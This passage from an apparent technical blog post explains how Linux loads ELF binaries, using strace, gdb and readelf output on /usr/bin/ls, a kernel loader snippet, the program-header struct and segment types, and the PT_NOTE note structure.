file program headers.</p><h2 id=loading>Loading<a hidden class=anchor aria-hidden=true href=#loading>#</a></h2><p>If we take a look with <code>strace</code> we can see a bit about how binaries are loaded and executed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ strace /usr/bin/ls 
</span></span><span class=line><span class=cl>execve(&#34;/usr/bin/ls&#34;, [&#34;ls&#34;], 0x7ffcba885000 /* 24 vars */) = 0
</span></span><span class=line><span class=cl>brk(NULL)                               = 0x5dca6c78b000
</span></span><span class=line><span class=cl>mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec0f8000
</span></span><span class=line><span class=cl>access(&#34;/etc/ld.so.preload&#34;, R_OK)      = -1 ENOENT (No such file or directory)
</span></span><span class=line><span class=cl>openat(AT_FDCWD, &#34;/etc/ld.so.cache&#34;, O_RDONLY|O_CLOEXEC) = 3
</span></span><span class=line><span class=cl>fstat(3, {st_mode=S_IFREG|0644, st_size=64795, ...}) = 0
</span></span><span class=line><span class=cl>mmap(NULL, 64795, PROT_READ, MAP_PRIVATE, 3, 0) = 0x749cec0e8000
</span></span><span class=line><span class=cl>close(3)                                = 0
</span></span><span class=line><span class=cl>openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libselinux.so.1&#34;, O_RDONLY|O_CLOEXEC) = 3
</span></span><span class=line><span class=cl>read(3, &#34;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&#34;..., 832) = 832
</span></span><span class=line><span class=cl>fstat(3, {st_mode=S_IFREG|0644, st_size=174472, ...}) = 0
</span></span><span class=line><span class=cl>mmap(NULL, 181960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec0bb000
</span></span><span class=line><span class=cl>mmap(0x749cec0c1000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x749cec0c1000
</span></span><span class=line><span class=cl>mmap(0x749cec0de000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0x749cec0de000
</span></span><span class=line><span class=cl>mmap(0x749cec0e4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x29000) = 0x749cec0e4000
</span></span><span class=line><span class=cl>mmap(0x749cec0e6000, 5832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec0e6000
</span></span><span class=line><span class=cl>close(3)                                = 0
</span></span><span class=line><span class=cl>openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libc.so.6&#34;, O_RDONLY|O_CLOEXEC) = 3
</span></span><span class=line><span class=cl>read(3, &#34;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\220\243\2\0\0\0\0\0&#34;..., 832) = 832
</span></span><span class=line><span class=cl>pread64(3, &#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;..., 784, 64) = 784
</span></span><span class=line><span class=cl>fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
</span></span><span class=line><span class=cl>pread64(3, &#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;..., 784, 64) = 784
</span></span><span class=line><span class=cl>mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cebe00000
</span></span><span class=line><span class=cl>mmap(0x749cebe28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x749cebe28000
</span></span><span class=line><span class=cl>mmap(0x749cebfb0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x749cebfb0000
</span></span><span class=line><span class=cl>mmap(0x749cebfff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x749cebfff000
</span></span><span class=line><span class=cl>mmap(0x749cec005000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec005000
</span></span><span class=line><span class=cl>close(3)                                = 0
</span></span><span class=line><span class=cl>openat(AT_FDCWD, &#34;/lib/x86_64-linux-gnu/libpcre2-8.so.0&#34;, O_RDONLY|O_CLOEXEC) = 3
</span></span><span class=line><span class=cl>read(3, &#34;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&#34;..., 832) = 832
</span></span><span class=line><span class=cl>fstat(3, {st_mode=S_IFREG|0644, st_size=625344, ...}) = 0
</span></span><span class=line><span class=cl>mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec021000
</span></span><span class=line><span class=cl>mmap(0x749cec023000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x749cec023000
</span></span><span class=line><span class=cl>mmap(0x749cec091000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x70000) = 0x749cec091000
</span></span><span class=line><span class=cl>mmap(0x749cec0b9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x97000) = 0x749cec0b9000
</span></span><span class=line><span class=cl>close(3)                                = 0
</span></span><span class=line><span class=cl>mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec01e000
</span></span><span class=line><span class=cl>arch_prctl(ARCH_SET_FS, 0x749cec01e800) = 0
</span></span><span class=line><span class=cl>set_tid_address(0x749cec01ead0)         = 86655
</span></span><span class=line><span class=cl>set_robust_list(0x749cec01eae0, 24)     = 0
</span></span><span class=line><span class=cl>rseq(0x749cec01f120, 0x20, 0, 0x53053053) = 0
</span></span><span class=line><span class=cl>mprotect(0x749cebfff000, 16384, PROT_READ) = 0
</span></span><span class=line><span class=cl>mprotect(0x749cec0b9000, 4096, PROT_READ) = 0
</span></span><span class=line><span class=cl>mprotect(0x749cec0e4000, 4096, PROT_READ) = 0
</span></span><span class=line><span class=cl>mprotect(0x5dca4b2a4000, 8192, PROT_READ) = 0
</span></span><span class=line><span class=cl>mprotect(0x749cec130000, 8192, PROT_READ) = 0
</span></span><span class=line><span class=cl>prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>// snipped
</span></span></code></pre></div><p>The kernel first calls <code>execve</code>, effectively forking the program by saying &ldquo;replacing my current program with this one.&rdquo;<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup></p><p>Then a call is made to <code>brk</code> to locate the end of the data segment<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup><sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>. The ELF header then gets parsed<sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup> to determine how to process the program headers and it is mapped into memory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// snippet from fs/binfmt_elf.c
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * load_elf_phdrs() - load ELF program headers
</span></span></span><span class=line><span class=cl><span class=cm> * @elf_ex:   ELF header of the binary whose program headers should be loaded
</span></span></span><span class=line><span class=cl><span class=cm> * @elf_file: the opened ELF binary file
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Loads ELF program headers from the binary file elf_file, which has the ELF
</span></span></span><span class=line><span class=cl><span class=cm> * header pointed to by elf_ex, into a newly allocated array. The caller is
</span></span></span><span class=line><span class=cl><span class=cm> * responsible for freeing the allocated data. Returns NULL upon failure.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=k>struct</span> <span class=n>elf_phdr</span> <span class=o>*</span><span class=nf>load_elf_phdrs</span><span class=p>(</span><span class=k>const</span> <span class=k>struct</span> <span class=n>elfhdr</span> <span class=o>*</span><span class=n>elf_ex</span><span class=p>,</span>
</span></span><span class=line><span class=cl>               <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>elf_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>elf_phdr</span> <span class=o>*</span><span class=n>elf_phdata</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>retval</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   * If the size of this structure has changed, then punt, since
</span></span></span><span class=line><span class=cl><span class=cm>   * we will be doing the wrong thing.
</span></span></span><span class=line><span class=cl><span class=cm>   */</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>elf_ex</span><span class=o>-&gt;</span><span class=n>e_phentsize</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>elf_phdr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Sanity check the number of program headers... */</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* ...and their total size. */</span>
</span></span><span class=line><span class=cl>  <span class=n>size</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>elf_phdr</span><span class=p>)</span> <span class=o>*</span> <span class=n>elf_ex</span><span class=o>-&gt;</span><span class=n>e_phnum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>size</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=n>size</span> <span class=o>&gt;</span> <span class=mi>65536</span> <span class=o>||</span> <span class=n>size</span> <span class=o>&gt;</span> <span class=n>ELF_MIN_ALIGN</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>elf_phdata</span> <span class=o>=</span> <span class=nf>kmalloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>GFP_KERNEL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>elf_phdata</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Read in the program headers */</span>
</span></span><span class=line><span class=cl>  <span class=n>retval</span> <span class=o>=</span> <span class=nf>elf_read</span><span class=p>(</span><span class=n>elf_file</span><span class=p>,</span> <span class=n>elf_phdata</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>elf_ex</span><span class=o>-&gt;</span><span class=n>e_phoff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>out</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>retval</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>kfree</span><span class=p>(</span><span class=n>elf_phdata</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>elf_phdata</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>elf_phdata</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The ELF interpeter handles how the file is loaded. It resolves the symbols, segments, and necessary information to run the binary.</p><p>In this case, the dynamic linker <code>ld.so</code> is called since our binary is dynamically linked. This resolves the dependencies necessary for execution.</p><p>And <code>mmap</code> gets called to allocate memory for all the necessary virtual memory mappings: the stack, heap, and anonymous mappings.</p><p>For each shared library the kernel needs, the loader uses <code>mmap()</code> to map the segments and each library into memory at the addresses specified by the ELF headers. Appropriate permissions are set. Relocations are processed by the linker<sup id=fnref:9><a href=#fn:9 class=footnote-ref role=doc-noteref>9</a></sup> and calls to <code>mprotect</code> set some memory locations into read-only mode. When the program is done executing, it calls <code>unmap()</code>.</p><p>And actually, a lot more than this happens. If we step through the program with <code>gdb</code> we see that <code>strace</code> is only giving us a high level overview.</p><p>We only see the syscalls. But execution of the run time dynamic linker actually begins at <code>_dl_start</code> within <code>elf/rtld.c</code>, and it&rsquo;s much more sophisticated.<sup id=fnref:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ cat breakpoints.log | grep Breakpoint | cut -f3 -d&#39; &#39; | awk &#39;!seen[$0]++&#39;
</span></span><span class=line><span class=cl>0x00007ffff7fe4540
</span></span><span class=line><span class=cl>_dl_start
</span></span><span class=line><span class=cl>elf_get_dynamic_info
</span></span><span class=line><span class=cl>_dl_start_final
</span></span><span class=line><span class=cl>_dl_setup_hash
</span></span><span class=line><span class=cl>_dl_sysdep_start
</span></span><span class=line><span class=cl>process_envvars
</span></span><span class=line><span class=cl>_dl_new_object
</span></span><span class=line><span class=cl>_dl_map_object_deps
</span></span><span class=line><span class=cl>0x00007ffff7fc7abe
</span></span><span class=line><span class=cl>_dl_map_object
</span></span><span class=line><span class=cl>_dl_map_object_from_fd
</span></span><span class=line><span class=cl>_dl_relocate_object
</span></span><span class=line><span class=cl>elf_machine_lazy_rel
</span></span><span class=line><span class=cl>__GI_mprotect
</span></span><span class=line><span class=cl>elf_machine_runtime_setup
</span></span><span class=line><span class=cl>__GI_munmap
</span></span></code></pre></div><p>We&rsquo;ll save this matter for a different post. But for now, just know that our <code>strace</code> output is in no way an exhaustive or full explanation of all the things that occur to enable loading our ELF binary. Though it does give us a view of the system calls that occur, which is helpful for tracing and debugging, it still conceals a lot of implementation details.</p><h2 id=segment-types>Segment Types<a hidden class=anchor aria-hidden=true href=#segment-types>#</a></h2><p>For each ELF program header segment, the <code>p_type</code> field tells the kernel how to interpret the header. For reference: the <code>elf64_phdr</code> structure and possible <code>p_type</code> values.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>elf64_phdr</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>p_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>p_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Off</span> <span class=n>p_offset</span><span class=p>;</span>       <span class=cm>/* Segment file offset */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span> <span class=n>p_vaddr</span><span class=p>;</span>       <span class=cm>/* Segment virtual address */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Addr</span> <span class=n>p_paddr</span><span class=p>;</span>       <span class=cm>/* Segment physical address */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>p_filesz</span><span class=p>;</span>     <span class=cm>/* Segment size in file */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>p_memsz</span><span class=p>;</span>      <span class=cm>/* Segment size in memory */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Xword</span> <span class=n>p_align</span><span class=p>;</span>      <span class=cm>/* Segment alignment, file &amp; memory */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Phdr</span><span class=p>;</span>
</span></span></code></pre></div><table><thead><tr><th>Type</th><th>Value</th><th>Description</th></tr></thead><tbody><tr><td>PT_NULL</td><td>0</td><td>Unused element</td></tr><tr><td>PT_LOAD</td><td>1</td><td>Loadable segment described by p_filesz and p_memsz</td></tr><tr><td>PT_DYNAMIC</td><td>2</td><td>Dynamic linking info</td></tr><tr><td>PT_INTERP</td><td>3</td><td>Interpreter to invoke; usually ld</td></tr><tr><td>PT_NOTE</td><td>4</td><td>Location and size of auxiliary info</td></tr><tr><td>PT_SHLIB</td><td>5</td><td>Reserved</td></tr><tr><td>PT_PHDR</td><td>6</td><td>Specifies location and size of program header table itself</td></tr><tr><td>PT_TLS</td><td>7</td><td>Specifies a thread local storage template</td></tr><tr><td>PT_LOPROC</td><td>0x70000000</td><td>Reserved</td></tr><tr><td>PT_HIPROC</td><td>0x7fffffff</td><td>Reserved</td></tr></tbody></table><p>For example, the <code>PT_DYNAMIC</code> segment specifies dynamic linking information. And the <code>PT_INTERP</code> segment specifies the interpreter to invoke. This is usually the dynamic linker <code>ld</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ readelf -p .interp /usr/bin/ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>String dump of section &#39;.interp&#39;:
</span></span><span class=line><span class=cl>  [     0]  /lib64/ld-linux-x86-64.so.2
</span></span></code></pre></div><p>But segments marked <code>PT_LOAD</code> denote loadable segments. <code>PT_LOAD</code> segments are described by the <code>p_filesz</code> and <code>p_memsz</code> fields.<sup id=fnref:11><a href=#fn:11 class=footnote-ref role=doc-noteref>11</a></sup> The bytes from <code>PT_LOAD</code> segments are mapped to the beginning of the memory segment. And later we will see that we actually have more granular control over where, exactly, things get mapped to via the <code>p_vaddr</code> field.</p><p>If we use <code>readelf</code> with the <code>-l</code> flag, we can see an ELF&rsquo;s program headers and each of their respective permission <code>Flags</code>: <code>read</code>, <code>write</code>, or <code>executable</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ readelf -l /usr/bin/ls
</span></span><span class=line><span class=cl>Elf file type is DYN (Position-Independent Executable file)
</span></span><span class=line><span class=cl>Entry point 0x6d30
</span></span><span class=line><span class=cl>There are 13 program headers, starting at offset 64
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Program Headers:
</span></span><span class=line><span class=cl>  Type           Offset             VirtAddr           PhysAddr
</span></span><span class=line><span class=cl>                 FileSiz            MemSiz              Flags  Align
</span></span><span class=line><span class=cl>  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
</span></span><span class=line><span class=cl>                 0x00000000000002d8 0x00000000000002d8  R      0x8
</span></span><span class=line><span class=cl>  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
</span></span><span class=line><span class=cl>                 0x000000000000001c 0x000000000000001c  R      0x1
</span></span><span class=line><span class=cl>      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</span></span><span class=line><span class=cl>  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>                 0x00000000000036f8 0x00000000000036f8  R      0x1000
</span></span><span class=line><span class=cl>  LOAD           0x0000000000004000 0x0000000000004000 0x0000000000004000
</span></span><span class=line><span class=cl>                 0x0000000000014db1 0x0000000000014db1  R E    0x1000
</span></span><span class=line><span class=cl>  LOAD           0x0000000000019000 0x0000000000019000 0x0000000000019000
</span></span><span class=line><span class=cl>                 0x00000000000071b8 0x00000000000071b8  R      0x1000
</span></span><span class=line><span class=cl>  LOAD           0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
</span></span><span class=line><span class=cl>                 0x0000000000001348 0x00000000000025e8  RW     0x1000
</span></span><span class=line><span class=cl>  DYNAMIC        0x0000000000021a38 0x0000000000022a38 0x0000000000022a38
</span></span><span class=line><span class=cl>                 0x0000000000000200 0x0000000000000200  RW     0x8
</span></span><span class=line><span class=cl>  NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
</span></span><span class=line><span class=cl>                 0x0000000000000030 0x0000000000000030  R      0x8
</span></span><span class=line><span class=cl>  NOTE           0x0000000000000368 0x0000000000000368 0x0000000000000368
</span></span><span class=line><span class=cl>                 0x0000000000000044 0x0000000000000044  R      0x4
</span></span><span class=line><span class=cl>  GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
</span></span><span class=line><span class=cl>                 0x0000000000000030 0x0000000000000030  R      0x8
</span></span><span class=line><span class=cl>  GNU_EH_FRAME   0x000000000001e170 0x000000000001e170 0x000000000001e170
</span></span><span class=line><span class=cl>                 0x00000000000005ec 0x00000000000005ec  R      0x4
</span></span><span class=line><span class=cl>  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>                 0x0000000000000000 0x0000000000000000  RW     0x10
</span></span><span class=line><span class=cl>  GNU_RELRO      0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
</span></span><span class=line><span class=cl>                 0x00000000000010d0 0x00000000000010d0  R      0x1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Section to Segment mapping:
</span></span><span class=line><span class=cl>  Segment Sections...
</span></span><span class=line><span class=cl>   00     
</span></span><span class=line><span class=cl>   01     .interp 
</span></span><span class=line><span class=cl>   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 
</span></span><span class=line><span class=cl>   03     .init .plt .plt.got .plt.sec .text .fini 
</span></span><span class=line><span class=cl>   04     .rodata .eh_frame_hdr .eh_frame 
</span></span><span class=line><span class=cl>   05     .init_array .fini_array .data.rel.ro .dynamic .got .data .bss 
</span></span><span class=line><span class=cl>   06     .dynamic 
</span></span><span class=line><span class=cl>   07     .note.gnu.property 
</span></span><span class=line><span class=cl>   08     .note.gnu.build-id .note.ABI-tag 
</span></span><span class=line><span class=cl>   09     .note.gnu.property 
</span></span><span class=line><span class=cl>   10     .eh_frame_hdr 
</span></span><span class=line><span class=cl>   11     
</span></span><span class=line><span class=cl>   12     .init_array .fini_array .data.rel.ro .dynamic .got 
</span></span></code></pre></div><p>The program header we&rsquo;re interested in is the <code>NOTE</code> segment. As you can see above, this particular header is not intended to be executable. By default it&rsquo;s read-only. The <code>PT_NOTE</code> header specifies an auxiliary field for storing information. We can see its construction here.</p><p>For example, a software vendor might desire to mark an executable with information to indicate remarks about compatibility. Together, the <code>PT_NOTE</code> section consists of an array of 4-byte words.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cm>/* Note header in a PT_NOTE section */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>elf64_note</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>n_namesz</span><span class=p>;</span>  <span class=cm>/* Name size */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>n_descsz</span><span class=p>;</span>  <span class=cm>/* Content size */</span>
</span></span><span class=line><span class=cl>  <span class=n>Elf64_Word</span> <span class=n>n_type</span><span class=p>;</span>    <span class=cm>/* Content type */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf64_Nhdr</span><span class=p>;</span>
</span></span></code></pre></div><p>The sizes for all of the ELF&rsquo;s corresponding types and sizes can be found in <code>elf.h</code> in almost any Linux <a href=https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/elf/elf.h>repo</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cm>/* Standard ELF types.  */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* Type for a 16-bit quantity.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint16_t</span> <span class=n>Elf32_Half</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint16_t</span> <span class=n>Elf64_Half</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Types for signed and unsigned 32-bit quantities.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint32_t</span> <span class=n>Elf32_Word</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>int32_t</span>  <span class=n>Elf32_Sword</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint32_t</span> <span class=n>Elf64_Word</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>int32_t</span>  <span class=n>Elf64_Sword</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Types for signed and unsigned 64-bit quantities.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint64_t</span> <span class=n>Elf32_Xword</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>int64_t</span>  <span class=n>Elf32_Sxword</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint64_t</span> <span class=n>Elf64_Xword</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>int64_t</span>  <span class=n>Elf64_Sxword</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Type of addresses.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint32_t</span> <span class=n>Elf32_Addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint64_t</span> <span class=n>Elf64_Addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Type of file offsets.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint32_t</span> <span class=n>Elf32_Off</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint64_t</span> <span class=n>Elf64_Off</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Type for section indices, which are 16-bit quantities.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint16_t</span> <span class=n>Elf32_Section</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=kt>uint16_t</span> <span class=n>Elf64_Section</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Type for version symbol information.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=n>Elf32_Half</span> <span class=n>Elf32_Versym</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=n>Elf64_Half</span> <span class=n>Elf64_Versym</span><span class=p>;</span>
</span></span></code></pre></div><p>If we want to see the <code>PT_NOTE</code> or <code>SHT_NOTE</code> segments of ELF binaries for ourselves, we can glean them using the <code>readelf</code> utility with the <code>-n</code> or <code>--notes</code> flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ readelf -n /usr/bin/ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Displaying notes found in: .note.gnu.property
</span></span><span class=line><span class=cl>  Owner                Data size    Description
</span></span><span class=line><span class=cl>  GNU                  0x00000020   NT_GNU_PROPERTY_TYPE_0
</span></span><span class=line><span class=cl>      Properties: x86 feature: IBT, SHSTK
</span></span><span class=line><span class=cl>    x86 ISA needed: x86-64-baseline
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Displaying notes found in: .note.gnu.build-id
</span></span><span class=line><span class=cl>  Owner                Data size    Description
</span></span><span class=line><span class=cl>  GNU                  0x00000014   NT_GNU_BUILD_ID (unique build ID bitstring)
</span></span><span class=line><span class=cl>    Build ID: 3eca7e3905b37d48cf0a88b576faa7b95cc3097b
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Displaying notes found in: .note.ABI-tag
</span></span><span class=line><span class=cl>  Owner                Data size    Description
</span></span><span class=line><span class=cl>  GNU                  0x00000010   NT_GNU_ABI_TAG (ABI version tag)
</span></span><span class=line><span class=cl>    OS: Linux, ABI: 3.2.0
